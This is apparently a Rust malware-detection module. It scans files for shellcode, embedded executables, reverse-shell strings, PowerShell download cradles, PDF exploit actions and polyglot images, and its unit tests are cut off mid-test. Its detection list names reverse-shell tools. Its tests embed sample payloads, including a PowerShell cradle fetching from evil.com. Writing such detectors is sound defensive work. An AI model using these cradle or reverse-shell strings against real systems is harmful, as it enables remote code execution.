use regex::bytes::Regex;
use std::sync::LazyLock;

use crate::magiscanner::analyzers::{AnalysisContext, Analyzer};
use crate::magiscanner::finding::{Finding, FindingKind, Severity};

/// File type determined by magic bytes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum FileType {
    Pdf,
    Jpeg,
    Png,
    Gif,
    Bmp,
    Webp,
    Tiff,
    Zip,
    Exe,
    Elf,
    MachO,
    Unknown,
}

fn detect_file_type(data: &[u8]) -> FileType {
    if data.len() < 4 {
        return FileType::Unknown;
    }
    match &data[..4] {
        [0x25, 0x50, 0x44, 0x46] => FileType::Pdf,  // %PDF
        [0xFF, 0xD8, 0xFF, ..] => FileType::Jpeg,   // JPEG
        [0x89, 0x50, 0x4E, 0x47] => FileType::Png,  // .PNG
        [0x47, 0x49, 0x46, 0x38] => FileType::Gif,  // GIF8
        [0x42, 0x4D, ..] => FileType::Bmp,          // BM
        [0x52, 0x49, 0x46, 0x46] => FileType::Webp, // RIFF (check WEBP later)
        [0x49, 0x49, 0x2A, 0x00] | [0x4D, 0x4D, 0x00, 0x2A] => FileType::Tiff,
        [0x50, 0x4B, 0x03, 0x04] => FileType::Zip, // PK..
        [0x4D, 0x5A, ..] => FileType::Exe,         // MZ (PE)
        [0x7F, 0x45, 0x4C, 0x46] => FileType::Elf, // .ELF
        [0xFE, 0xED, 0xFA, ..] | [0xCF, 0xFA, 0xED, 0xFE] => FileType::MachO,
        _ => FileType::Unknown,
    }
}

fn is_image(ft: FileType) -> bool {
    matches!(
        ft,
        FileType::Jpeg
            | FileType::Png
            | FileType::Gif
            | FileType::Bmp
            | FileType::Webp
            | FileType::Tiff
    )
}

fn is_document(ft: FileType) -> bool {
    matches!(ft, FileType::Pdf | FileType::Zip)
}

// --- IP Address patterns ---

static IPV4_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?-u)(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)").unwrap()
});

static URL_IN_BINARY_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?-u)(?:https?|ftp)://[a-zA-Z0-9\x2d\x2e]+(?:\x2e[a-zA-Z]{2,})[^\x00-\x1f\x7f ]*")
        .unwrap()
});

/// Known metadata/EXIF markers where URLs are expected (camera software, etc.)
fn is_in_metadata_region(data: &[u8], offset: usize, file_type: FileType) -> bool {
    match file_type {
        FileType::Jpeg => {
            // JPEG APP markers (0xFFE0-0xFFEF) contain EXIF/XMP/JFIF metadata
            // Walk the JPEG segment structure to check
            let mut pos = 2; // skip SOI
            while pos + 3 < data.len() && pos < offset {
                if data[pos] != 0xFF {
                    break;
                }
                let marker = data[pos + 1];
                // APP0-APP15 (0xE0-0xEF) and COM (0xFE) are metadata
                let is_metadata_marker = (0xE0..=0xEF).contains(&marker) || marker == 0xFE;
                if pos + 3 < data.len() {
                    let seg_len = ((data[pos + 2] as usize) << 8) | (data[pos + 3] as usize);
                    let seg_end = pos + 2 + seg_len;
                    if is_metadata_marker && offset >= pos && offset < seg_end {
                        return true;
                    }
                    pos = seg_end;
                } else {
                    break;
                }
            }
            false
        }
        FileType::Png => {
            // PNG: tEXt, iTXt, zTXt chunks contain metadata
            // Check if offset falls within a text chunk
            let mut pos = 8; // skip PNG signature
            while pos + 8 < data.len() && pos < offset {
                if pos + 8 > data.len() {
                    break;
                }
                let chunk_len =
                    u32::from_be_bytes([data[pos], data[pos + 1], data[pos + 2], data[pos + 3]])
                        as usize;
                let chunk_type = &data[pos + 4..pos + 8];
                let chunk_end = pos + 12 + chunk_len;
                let is_text =
                    chunk_type == b"tEXt" || chunk_type == b"iTXt" || chunk_type == b"zTXt";
                if is_text && offset >= pos && offset < chunk_end {
                    return true;
                }
                pos = chunk_end;
            }
            false
        }
        _ => false,
    }
}

/// Classify an IP address for suspiciousness.
#[derive(Debug)]
enum IpClass {
    PrivateNetwork, // 10.x, 172.16-31.x, 192.168.x
    Loopback,       // 127.x
    LinkLocal,      // 169.254.x
    Multicast,      // 224-239.x
    Public,         // everything else
}

fn classify_ip(ip: &str) -> Option<IpClass> {
    let parts: Vec<u8> = ip.split('.').filter_map(|p| p.parse().ok()).collect();
    if parts.len() != 4 {
        return None;
    }
    Some(match (parts[0], parts[1]) {
        (10, _) => IpClass::PrivateNetwork,
        (172, 16..=31) => IpClass::PrivateNetwork,
        (192, 168) => IpClass::PrivateNetwork,
        (127, _) => IpClass::Loopback,
        (169, 254) => IpClass::LinkLocal,
        (224..=239, _) => IpClass::Multicast,
        _ => IpClass::Public,
    })
}

// --- Shellcode / exploit patterns ---

struct BytePattern {
    name: &'static str,
    pattern: &'static [u8],
    description: &'static str,
    severity: Severity,
}

const BYTE_PATTERNS: &[BytePattern] = &[
    // NOP sleds (common in buffer overflow exploits)
    BytePattern {
        name: "x86 NOP sled",
        pattern: &[
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
            0x90, 0x90,
        ],
        description: "16+ byte x86 NOP sled detected (common exploit technique)",
        severity: Severity::Critical,
    },
    // MZ header (PE executable embedded in non-executable)
    BytePattern {
        name: "embedded PE executable",
        pattern: &[0x4D, 0x5A, 0x90, 0x00],
        description: "PE executable header (MZ) found embedded in file",
        severity: Severity::Critical,
    },
    // ELF header embedded
    BytePattern {
        name: "embedded ELF binary",
        pattern: &[0x7F, 0x45, 0x4C, 0x46],
        description: "ELF binary header found embedded in file",
        severity: Severity::Critical,
    },
    // Common x86 shellcode prologues
    BytePattern {
        name: "x86 shellcode (int 0x80)",
        pattern: &[0xCD, 0x80],
        description: "Linux syscall interrupt (int 0x80) found -- possible shellcode",
        severity: Severity::High,
    },
    BytePattern {
        name: "x86 shellcode (syscall)",
        pattern: &[0x0F, 0x05],
        description: "x86-64 syscall instruction found -- possible shellcode",
        severity: Severity::High,
    },
    // Windows shellcode: kernel32.dll / ws2_32.dll loading patterns
    BytePattern {
        name: "kernel32.dll reference",
        pattern: b"kernel32.dll",
        description: "Reference to kernel32.dll found (common in Windows shellcode)",
        severity: Severity::High,
    },
    BytePattern {
        name: "ws2_32.dll reference",
        pattern: b"ws2_32.dll",
        description: "Reference to ws2_32.dll (Winsock) found (common in reverse shells)",
        severity: Severity::Critical,
    },
    // PowerShell download cradles
    BytePattern {
        name: "PowerShell IEX",
        pattern: b"IEX(",
        description: "PowerShell Invoke-Expression detected (common download cradle)",
        severity: Severity::Critical,
    },
    BytePattern {
        name: "PowerShell encoded command",
        pattern: b"-EncodedCommand",
        description: "PowerShell encoded command flag (used to hide malicious payloads)",
        severity: Severity::Critical,
    },
    BytePattern {
        name: "PowerShell download",
        pattern: b"DownloadString(",
        description: "PowerShell DownloadString (remote code loading)",
        severity: Severity::Critical,
    },
    // /bin/sh reference in non-executable
    BytePattern {
        name: "/bin/sh reference",
        pattern: b"/bin/sh",
        description: "Shell path /bin/sh found (may indicate command execution payload)",
        severity: Severity::High,
    },
    BytePattern {
        name: "/bin/bash reference",
        pattern: b"/bin/bash",
        description: "Shell path /bin/bash found (may indicate command execution payload)",
        severity: Severity::High,
    },
    // cmd.exe reference
    BytePattern {
        name: "cmd.exe reference",
        pattern: b"cmd.exe",
        description: "Windows command shell reference found",
        severity: Severity::High,
    },
    // --- OS networking / syscall references ---
    // Windows networking
    BytePattern {
        name: "WSAStartup",
        pattern: b"WSAStartup",
        description: "Windows Socket API initialization (WSAStartup) -- network access capability",
        severity: Severity::High,
    },
    BytePattern {
        name: "WSASocket",
        pattern: b"WSASocketA",
        description: "Windows raw socket creation (WSASocket) -- possible reverse shell",
        severity: Severity::Critical,
    },
    BytePattern {
        name: "InternetOpenUrl",
        pattern: b"InternetOpenUrl",
        description:
            "Windows WinINet URL access (InternetOpenUrl) -- downloads content from internet",
        severity: Severity::High,
    },
    BytePattern {
        name: "URLDownloadToFile",
        pattern: b"URLDownloadToFile",
        description: "Windows URL download to disk (URLDownloadToFile) -- dropper technique",
        severity: Severity::Critical,
    },
    BytePattern {
        name: "HttpSendRequest",
        pattern: b"HttpSendRequest",
        description: "Windows HTTP request (HttpSendRequest) -- network exfiltration capability",
        severity: Severity::High,
    },
    BytePattern {
        name: "WinHttpOpen",
        pattern: b"WinHttpOpen",
        description: "Windows HTTP API (WinHttpOpen) -- network access capability",
        severity: Severity::High,
    },
    // Cross-platform networking strings
    BytePattern {
        name: "socket() call",
        pattern: b"socket\x00",
        description: "Socket creation function reference (network access capability)",
        severity: Severity::High,
    },
    BytePattern {
        name: "connect() call",
        pattern: b"connect\x00",
        description: "Socket connect function reference (outbound network connection)",
        severity: Severity::High,
    },
    BytePattern {
        name: "getaddrinfo reference",
        pattern: b"getaddrinfo",
        description: "DNS resolution function (getaddrinfo) -- hostname lookup capability",
        severity: Severity::Medium,
    },
    BytePattern {
        name: "gethostbyname reference",
        pattern: b"gethostbyname",
        description: "DNS resolution function (gethostbyname) -- hostname lookup capability",
        severity: Severity::Medium,
    },
    // Linux-specific networking
    BytePattern {
        name: "libcurl reference",
        pattern: b"libcurl",
        description: "libcurl library reference -- HTTP transfer capability",
        severity: Severity::Medium,
    },
    BytePattern {
        name: "curl_easy_perform",
        pattern: b"curl_easy_perform",
        description: "libcurl transfer execution -- active network transfer capability",
        severity: Severity::High,
    },
    // Python/scripting network calls (in non-script files)
    BytePattern {
        name: "urllib request",
        pattern: b"urllib.request",
        description: "Python urllib network access found",
        severity: Severity::High,
    },
    BytePattern {
        name: "requests.get",
        pattern: b"requests.get(",
        description: "Python requests library HTTP call found",
        severity: Severity::High,
    },
    BytePattern {
        name: "subprocess.Popen",
        pattern: b"subprocess.Popen",
        description: "Python subprocess execution found -- command execution capability",
        severity: Severity::Critical,
    },
    BytePattern {
        name: "os.system call",
        pattern: b"os.system(",
        description: "Python os.system() call -- direct command execution",
        severity: Severity::Critical,
    },
    BytePattern {
        name: "eval() call",
        pattern: b"eval(",
        description: "Dynamic code evaluation (eval) -- code injection risk",
        severity: Severity::High,
    },
    BytePattern {
        name: "exec() call",
        pattern: b"exec(",
        description: "Dynamic code execution (exec) -- code injection risk",
        severity: Severity::High,
    },
    // Reverse shell indicators
    BytePattern {
        name: "netcat reverse shell",
        pattern: b"nc -e",
        description: "Netcat with execute flag -- reverse shell pattern",
        severity: Severity::Critical,
    },
    BytePattern {
        name: "bash reverse shell",
        pattern: b"/dev/tcp/",
        description: "Bash /dev/tcp redirection -- reverse shell technique",
        severity: Severity::Critical,
    },
    BytePattern {
        name: "mkfifo pipe",
        pattern: b"mkfifo /tmp/",
        description: "Named pipe creation in /tmp -- often used in reverse shell chains",
        severity: Severity::Critical,
    },
];

// --- PDF-specific dangerous patterns ---

static PDF_PATTERNS: LazyLock<Vec<(&'static str, Regex, Severity)>> = LazyLock::new(|| {
    vec![
        (
            "PDF JavaScript",
            Regex::new(r"(?-u)/JavaScript|/JS\s").unwrap(),
            Severity::High,
        ),
        (
            "PDF Launch action",
            Regex::new(r"(?-u)/Launch\s").unwrap(),
            Severity::Critical,
        ),
        (
            "PDF SubmitForm",
            Regex::new(r"(?-u)/SubmitForm\s").unwrap(),
            Severity::High,
        ),
        (
            "PDF ImportData",
            Regex::new(r"(?-u)/ImportData\s").unwrap(),
            Severity::High,
        ),
        (
            "PDF OpenAction",
            Regex::new(r"(?-u)/OpenAction\s").unwrap(),
            Severity::Medium,
        ),
        (
            "PDF AA (Additional Action)",
            Regex::new(r"(?-u)/AA\s").unwrap(),
            Severity::Medium,
        ),
        (
            "PDF RichMedia",
            Regex::new(r"(?-u)/RichMedia\s").unwrap(),
            Severity::Medium,
        ),
        (
            "PDF AcroForm",
            Regex::new(r"(?-u)/AcroForm\s").unwrap(),
            Severity::Low,
        ),
        (
            "PDF embedded file",
            Regex::new(r"(?-u)/EmbeddedFile\s").unwrap(),
            Severity::Medium,
        ),
        (
            "PDF XFA form",
            Regex::new(r"(?-u)/XFA\s").unwrap(),
            Severity::High,
        ),
        (
            "PDF object stream obfuscation",
            Regex::new(r"(?-u)/ObjStm\s").unwrap(),
            Severity::Low,
        ),
    ]
});

/// Detects suspicious patterns in files -- execution indicators, shellcode,
/// embedded executables, IP addresses in places they shouldn't be, and
/// format-specific exploit patterns (PDF JavaScript, etc.).
pub struct SuspiciousPatternAnalyzer;

impl SuspiciousPatternAnalyzer {
    pub fn new() -> Self {
        Self
    }

    fn check_ips(&self, data: &[u8], file_type: FileType) -> Vec<Finding> {
        let mut findings = Vec::new();

        for m in IPV4_REGEX.find_iter(data) {
            let ip_str = std::str::from_utf8(m.as_bytes()).unwrap_or("");
            let class = match classify_ip(ip_str) {
                Some(c) => c,
                None => continue,
            };

            // IPs in images are always suspicious
            // Private/loopback IPs in any non-code file are suspicious
            let (severity, desc) = match (&class, is_image(file_type)) {
                (IpClass::PrivateNetwork, true) => (
                    Severity::Critical,
                    format!("Private network IP {ip_str} found in image file -- likely exploit payload targeting local network"),
                ),
                (IpClass::Loopback, true) => (
                    Severity::High,
                    format!("Loopback IP {ip_str} found in image file -- possible exploit callback"),
                ),
                (IpClass::Public, true) => (
                    Severity::High,
                    format!("Public IP {ip_str} found in image file -- possible C2 beacon or exploit payload"),
                ),
                (IpClass::PrivateNetwork, false) if is_document(file_type) => (
                    Severity::High,
                    format!("Private network IP {ip_str} found in document -- possible lateral movement target"),
                ),
                (IpClass::Loopback, false) if is_document(file_type) => (
                    Severity::Medium,
                    format!("Loopback IP {ip_str} found in document"),
                ),
                _ => continue, // Don't flag IPs in unknown/executable files
            };

            // Extract surrounding context (64 bytes each side), sanitized for display
            let ctx_start = m.start().saturating_sub(64);
            let ctx_end = (m.end() + 64).min(data.len());
            let evidence = sanitize_evidence(&data[ctx_start..ctx_end]);

            findings.push(Finding {
                kind: FindingKind::SuspiciousString {
                    value: format!("IP:{ip_str} ({class:?}) in {file_type:?}"),
                },
                severity,
                description: desc,
                offset: Some(m.start()),
                evidence: Some(evidence),
            });
        }

        findings
    }

    fn check_byte_patterns(&self, data: &[u8], file_type: FileType) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Skip checking for embedded executables if the file IS an executable
        let is_exec = matches!(file_type, FileType::Exe | FileType::Elf | FileType::MachO);

        for pat in BYTE_PATTERNS {
            // Don't flag embedded PE/ELF in actual executables
            if is_exec && (pat.name.contains("embedded PE") || pat.name.contains("embedded ELF")) {
                continue;
            }

            // Don't flag shell paths in executables (normal)
            if is_exec
                && (pat.name.contains("/bin/sh")
                    || pat.name.contains("/bin/bash")
                    || pat.name.contains("cmd.exe"))
            {
                continue;
            }

            // Search for pattern (skip position 0 for MZ/ELF since that's the file header)
            let search_start = if pat.name.contains("embedded") { 4 } else { 0 };
            let search_data = if search_start < data.len() {
                &data[search_start..]
            } else {
                continue;
            };

            for (offset, window) in search_data.windows(pat.pattern.len()).enumerate() {
                if window == pat.pattern {
                    let abs_offset = offset + search_start;

                    // For syscall instructions (2 bytes), only flag in images/docs where they're very suspicious
                    if pat.pattern.len() <= 2 && !is_image(file_type) && !is_document(file_type) {
                        continue;
                    }

                    // Extract context
                    let ctx_start = abs_offset.saturating_sub(32);
                    let ctx_end = (abs_offset + pat.pattern.len() + 32).min(data.len());
                    let context = &data[ctx_start..ctx_end];
                    let evidence = format!(
                        "offset 0x{abs_offset:08x}: {}",
                        context
                            .iter()
                            .map(|b| format!("{b:02x}"))
                            .collect::<Vec<_>>()
                            .join(" ")
                    );

                    findings.push(Finding {
                        kind: FindingKind::SuspiciousString {
                            value: pat.name.to_string(),
                        },
                        severity: if is_image(file_type) {
                            // Bump severity for images -- these should NEVER have execution patterns
                            Severity::Critical
                        } else {
                            pat.severity
                        },
                        description: format!("{} (in {:?} file)", pat.description, file_type),
                        offset: Some(abs_offset),
                        evidence: Some(evidence.chars().take(120).collect()),
                    });

                    // Only report first occurrence per pattern
                    break;
                }
            }
        }

        findings
    }

    fn check_pdf_patterns(&self, data: &[u8]) -> Vec<Finding> {
        let mut findings = Vec::new();

        for (name, pattern, severity) in PDF_PATTERNS.iter() {
            if let Some(m) = pattern.find(data) {
                let ctx_start = m.start().saturating_sub(40);
                let ctx_end = (m.end() + 40).min(data.len());
                let context = sanitize_evidence(&data[ctx_start..ctx_end]);

                findings.push(Finding {
                    kind: FindingKind::SuspiciousString {
                        value: format!("PDF:{name}"),
                    },
                    severity: *severity,
                    description: format!(
                        "{name} action found in PDF -- can execute code or exfiltrate data"
                    ),
                    offset: Some(m.start()),
                    evidence: Some(context),
                });
            }
        }

        findings
    }

    fn check_polyglot(&self, data: &[u8], file_type: FileType) -> Vec<Finding> {
        let mut findings = Vec::new();

        if !is_image(file_type) || data.len() < 16 {
            return findings;
        }

        // Check for HTML/script content after image data.
        // Patterns must be long enough to avoid false positives from random binary data.
        // Short patterns like "<%" are excluded -- 2 bytes match too easily in binary noise.
        let search_patterns: &[(&[u8], &str)] = &[
            (b"<script", "HTML <script> tag embedded after image data"),
            (b"<iframe", "HTML <iframe> tag embedded after image data"),
            (
                b"<svg ",
                "SVG element embedded after image data (possible XSS)",
            ),
            (
                b"<svg\n",
                "SVG element embedded after image data (possible XSS)",
            ),
            (b"<?php", "PHP code embedded after image data"),
            (b"<%@ ", "ASP directive embedded after image data"),
            (b"<% ", "ASP code block embedded after image data"),
        ];

        // Search the latter half of the file (polyglot payloads usually trail)
        let search_start = data.len() / 2;
        let tail = &data[search_start..];
        let tail_lower: Vec<u8> = tail.iter().map(|b| b.to_ascii_lowercase()).collect();

        for (pattern, desc) in search_patterns {
            let pattern_lower: Vec<u8> = pattern.iter().map(|b| b.to_ascii_lowercase()).collect();
            if let Some(pos) = tail_lower
                .windows(pattern_lower.len())
                .position(|w| w == pattern_lower.as_slice())
            {
                let abs_offset = search_start + pos;

                // Verify the surrounding bytes look like actual text/code, not binary noise.
                // Real polyglot payloads are readable code. Random binary that happens to
                // contain "<script" followed by garbage is not an attack.
                let ctx_end = (abs_offset + 80).min(data.len());
                let context_bytes = &data[abs_offset..ctx_end];
                let printable_ratio = context_bytes
                    .iter()
                    .filter(|&&b| b.is_ascii_graphic() || b.is_ascii_whitespace())
                    .count() as f64
                    / context_bytes.len() as f64;

                // If less than 60% of surrounding bytes are printable ASCII,
                // this is binary noise, not an actual code payload
                if printable_ratio < 0.6 {
                    continue;
                }

                let evidence = sanitize_evidence(context_bytes);

                findings.push(Finding {
                    kind: FindingKind::SuspiciousString {
                        value: format!("polyglot:{}", String::from_utf8_lossy(pattern).trim()),
                    },
                    severity: Severity::Critical,
                    description: format!("{desc} -- polyglot file attack"),
                    offset: Some(abs_offset),
                    evidence: Some(evidence),
                });
            }
        }

        findings
    }

    fn check_urls_in_binary(&self, data: &[u8], file_type: FileType) -> Vec<Finding> {
        let mut findings = Vec::new();

        if !is_image(file_type) {
            return findings;
        }

        for m in URL_IN_BINARY_REGEX.find_iter(data) {
            let url = String::from_utf8_lossy(m.as_bytes()).to_string();

            // Skip if this URL is in a metadata region (EXIF, XMP, etc.)
            if is_in_metadata_region(data, m.start(), file_type) {
                continue;
            }

            // Extract surrounding context
            let ctx_start = m.start().saturating_sub(32);
            let ctx_end = (m.end() + 32).min(data.len());
            let context = sanitize_evidence(&data[ctx_start..ctx_end]);

            findings.push(Finding {
                kind: FindingKind::SuspiciousString {
                    value: format!("url_in_image:{url}"),
                },
                severity: Severity::High,
                description: format!(
                    "URL found in image data (outside metadata): {url} -- images should not contain URLs in pixel data"
                ),
                offset: Some(m.start()),
                evidence: Some(context),
            });
        }

        findings
    }

    fn check_entropy_anomaly(&self, data: &[u8], file_type: FileType) -> Vec<Finding> {
        let mut findings = Vec::new();

        if data.len() < 256 {
            return findings;
        }

        // Check entropy of the whole file
        let entropy = calculate_entropy(data);

        // High entropy in images can indicate steganography or embedded encrypted payloads
        // Normal images: JPEG ~7.5-7.9, PNG ~7.0-7.8 (compressed), BMP ~4-6 (uncompressed)
        // Encrypted/random data: ~7.99+
        if is_image(file_type) && entropy > 7.99 {
            findings.push(Finding {
                kind: FindingKind::SuspiciousString {
                    value: format!("high_entropy:{entropy:.4}"),
                },
                severity: Severity::Medium,
                description: format!(
                    "Unusually high entropy ({entropy:.4}) for image file -- may contain encrypted/hidden data (steganography)"
                ),
                offset: None,
                evidence: Some(format!("Shannon entropy: {entropy:.4} bits/byte (max 8.0)")),
            });
        }

        // Check for high-entropy blocks in the file (could be encrypted shellcode)
        let block_size = 256;
        for (i, chunk) in data.chunks(block_size).enumerate() {
            if chunk.len() < block_size {
                break;
            }
            let block_entropy = calculate_entropy(chunk);

            // A block with near-perfect entropy in an image is very suspicious
            if is_image(file_type) && block_entropy > 7.98 && i > 0 {
                findings.push(Finding {
                    kind: FindingKind::SuspiciousString {
                        value: format!("entropy_block:0x{:x}:{block_entropy:.4}", i * block_size),
                    },
                    severity: Severity::Medium,
                    description: format!(
                        "High-entropy block at offset 0x{:x} ({block_entropy:.4} bits/byte) -- possible encrypted payload",
                        i * block_size
                    ),
                    offset: Some(i * block_size),
                    evidence: Some(format!(
                        "Block {i} (0x{:x}-0x{:x}): entropy {block_entropy:.4}",
                        i * block_size,
                        (i + 1) * block_size
                    )),
                });
                // Only report first suspicious block
                break;
            }
        }

        findings
    }
}

/// Sanitize binary evidence for safe display and storage.
/// Replaces non-printable bytes with hex notation, keeps ASCII readable.
fn sanitize_evidence(data: &[u8]) -> String {
    let mut result = String::with_capacity(data.len() * 2);
    for &byte in data.iter().take(120) {
        if byte.is_ascii_graphic() || byte == b' ' {
            result.push(byte as char);
        } else if byte == b'\n' || byte == b'\r' || byte == b'\t' {
            result.push(' ');
        } else {
            result.push_str(&format!("\\x{byte:02x}"));
        }
    }
    result
}

fn calculate_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0u64; 256];
    for &byte in data {
        counts[byte as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

impl Default for SuspiciousPatternAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

impl Analyzer for SuspiciousPatternAnalyzer {
    fn name(&self) -> &'static str {
        "suspicious_patterns"
    }

    fn analyze(&self, context: &AnalysisContext) -> Result<Vec<Finding>, anyhow::Error> {
        let data = &context.raw_content;
        let file_type = detect_file_type(data);
        let mut findings = Vec::new();

        // For large files (>2MB), only scan head + tail regions for byte patterns.
        // Exploit payloads hide in headers/trailers/metadata, not deep inside
        // compressed video/audio frames. This cuts scan time from minutes to ms.
        const LARGE_FILE_THRESHOLD: usize = 2 * 1024 * 1024; // 2MB
        const SCAN_REGION_SIZE: usize = 512 * 1024; // 512KB head + tail

        let scan_data: std::borrow::Cow<'_, [u8]> = if data.len() > LARGE_FILE_THRESHOLD
            && !matches!(file_type, FileType::Pdf)
        // Always full-scan PDFs
        {
            let head_end = SCAN_REGION_SIZE.min(data.len());
            let tail_start = data.len().saturating_sub(SCAN_REGION_SIZE);
            if tail_start <= head_end {
                // File isn't much bigger than 2 regions, just scan all of it
                std::borrow::Cow::Borrowed(data)
            } else {
                let mut combined = Vec::with_capacity(head_end + (data.len() - tail_start));
                combined.extend_from_slice(&data[..head_end]);
                combined.extend_from_slice(&data[tail_start..]);
                tracing::debug!(
                    file_size = data.len(),
                    scan_size = combined.len(),
                    "large file: scanning head + tail only"
                );
                std::borrow::Cow::Owned(combined)
            }
        } else {
            std::borrow::Cow::Borrowed(data)
        };

        // 1. IP addresses in suspicious contexts
        findings.extend(self.check_ips(&scan_data, file_type));

        // 2. Shellcode and executable byte patterns
        findings.extend(self.check_byte_patterns(&scan_data, file_type));

        // 3. PDF-specific exploit patterns
        if file_type == FileType::Pdf {
            findings.extend(self.check_pdf_patterns(data)); // full data for PDFs
        }

        // 4. Polyglot file detection (script content in images)
        findings.extend(self.check_polyglot(data, file_type)); // needs full data for tail check

        // 5. URLs in image data (outside metadata regions)
        findings.extend(self.check_urls_in_binary(&scan_data, file_type));

        // 6. Entropy anomalies (steganography, encrypted payloads)
        findings.extend(self.check_entropy_anomaly(data, file_type)); // needs full data for overall entropy

        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_context(data: &[u8], name: &str) -> AnalysisContext {
        AnalysisContext {
            file_path: name.to_string(),
            file_name: name.to_string(),
            sha256: "test".to_string(),
            extracted_urls: vec![],
            raw_content: data.to_vec(),
            processed_content: vec![],
        }
    }

    #[test]
    fn test_ip_in_jpeg() {
        // JPEG magic + some data + an IP address
        let mut data = vec![0xFF, 0xD8, 0xFF, 0xE0];
        data.extend_from_slice(&[0x00; 100]);
        data.extend_from_slice(b"192.168.1.100");
        data.extend_from_slice(&[0x00; 50]);

        let analyzer = SuspiciousPatternAnalyzer::new();
        let ctx = make_context(&data, "test.jpg");
        let findings = analyzer.analyze(&ctx).unwrap();
        assert!(
            findings.iter().any(|f| f.severity == Severity::Critical
                && f.description.contains("Private network IP")),
            "should flag private IP in JPEG as critical: {findings:?}"
        );
    }

    #[test]
    fn test_nop_sled_in_image() {
        let mut data = vec![0x89, 0x50, 0x4E, 0x47]; // PNG magic
        data.extend_from_slice(&[0x00; 50]);
        data.extend_from_slice(&[0x90; 20]); // NOP sled
        data.extend_from_slice(&[0x00; 50]);

        let analyzer = SuspiciousPatternAnalyzer::new();
        let ctx = make_context(&data, "test.png");
        let findings = analyzer.analyze(&ctx).unwrap();
        assert!(
            findings.iter().any(|f| f.description.contains("NOP sled")),
            "should detect NOP sled in PNG: {findings:?}"
        );
    }

    #[test]
    fn test_embedded_exe_in_image() {
        let mut data = vec![0xFF, 0xD8, 0xFF, 0xE0]; // JPEG magic
        data.extend_from_slice(&[0x00; 100]);
        data.extend_from_slice(&[0x4D, 0x5A, 0x90, 0x00]); // MZ header
        data.extend_from_slice(&[0x00; 100]);

        let analyzer = SuspiciousPatternAnalyzer::new();
        let ctx = make_context(&data, "test.jpg");
        let findings = analyzer.analyze(&ctx).unwrap();
        assert!(
            findings
                .iter()
                .any(|f| f.description.contains("PE executable")),
            "should detect embedded PE in JPEG: {findings:?}"
        );
    }

    #[test]
    fn test_pdf_javascript() {
        let mut data = b"%PDF-1.4 some content /JavaScript (evil code) endobj".to_vec();
        let analyzer = SuspiciousPatternAnalyzer::new();
        let ctx = make_context(&data, "test.pdf");
        let findings = analyzer.analyze(&ctx).unwrap();
        assert!(
            findings
                .iter()
                .any(|f| f.description.contains("JavaScript")),
            "should detect JavaScript in PDF: {findings:?}"
        );
    }

    #[test]
    fn test_pdf_launch() {
        let data = b"%PDF-1.4 obj /Launch /Win /F (cmd.exe) endobj";
        let analyzer = SuspiciousPatternAnalyzer::new();
        let ctx = make_context(data, "test.pdf");
        let findings = analyzer.analyze(&ctx).unwrap();
        assert!(
            findings
                .iter()
                .any(|f| f.description.contains("Launch") && f.severity == Severity::Critical),
            "should detect /Launch in PDF as critical: {findings:?}"
        );
    }

    #[test]
    fn test_polyglot_image_html() {
        let mut data = vec![0xFF, 0xD8, 0xFF, 0xE0]; // JPEG
        data.extend_from_slice(&[0x00; 200]);
        data.extend_from_slice(b"<script>alert('xss')</script>");

        let analyzer = SuspiciousPatternAnalyzer::new();
        let ctx = make_context(&data, "test.jpg");
        let findings = analyzer.analyze(&ctx).unwrap();
        assert!(
            findings.iter().any(|f| f.description.contains("polyglot")),
            "should detect polyglot JPEG+HTML: {findings:?}"
        );
    }

    #[test]
    fn test_powershell_in_pdf() {
        let mut data = b"%PDF-1.4 ".to_vec();
        data.extend_from_slice(
            b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
        );

        let analyzer = SuspiciousPatternAnalyzer::new();
        let ctx = make_context(&data, "test.pdf");
        let findings = analyzer.analyze(&ctx).unwrap();
        assert!(
            findings
                .iter()
                .any(|f| f.description.contains("PowerShell") || f.description.contains("IEX")),
            "should detect PowerShell download cradle: {findings:?}"
        );
    }

    #[test]
    fn test_clean_jpeg() {
        // A minimal "clean" JPEG-like blob (just magic + regular image bytes, no anomalies)
        let mut data = vec![0xFF, 0xD8, 0xFF, 0xE0];
        // Fill with semi-random but not suspicious data
        for i in 0..500u16 {
            data.push((i % 200) as u8 + 20);
        }

        let analyzer = SuspiciousPatternAnalyzer::new();
        let ctx = make_context(&data, "clean.jpg");
        let findings = analyzer.analyze(&ctx).unwrap();
        // Should have no critical/high findings
        assert!(
            !findings.iter().any(|f| f.severity >= Severity::High),
            "clean JPEG should not have high+ findings: {findings:?}"
        );
    }

    #[test]
    fn test_url_in_image_data() {
        let mut data = vec![0xFF, 0xD8, 0xFF, 0xE0]; // JPEG magic
                                                     // Fake a short JFIF APP0 segment (metadata area)
        data.extend_from_slice(&[0x00, 0x10]); // length = 16
        data.extend_from_slice(b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00");
        // Now we're past metadata — pixel data area
        data.extend_from_slice(&[0x00; 100]);
        data.extend_from_slice(b"http://evil.com/malware.exe");
        data.extend_from_slice(&[0x00; 50]);

        let analyzer = SuspiciousPatternAnalyzer::new();
        let ctx = make_context(&data, "test.jpg");
        let findings = analyzer.analyze(&ctx).unwrap();
        assert!(
            findings
                .iter()
                .any(|f| f.description.contains("URL found in image data")),
            "should flag URL in image pixel data: {findings:?}"
        );
    }

    #[test]
    fn test_url_in_image_metadata_ok() {
        // Build a JPEG with a URL inside an APP0 metadata segment
        let mut data = vec![0xFF, 0xD8, 0xFF, 0xE0]; // JPEG SOI + APP0 marker
                                                     // APP0 segment containing a URL (this is metadata, should be allowed)
        let url = b"http://camera-software.com/version";
        let seg_len = (url.len() + 2) as u16;
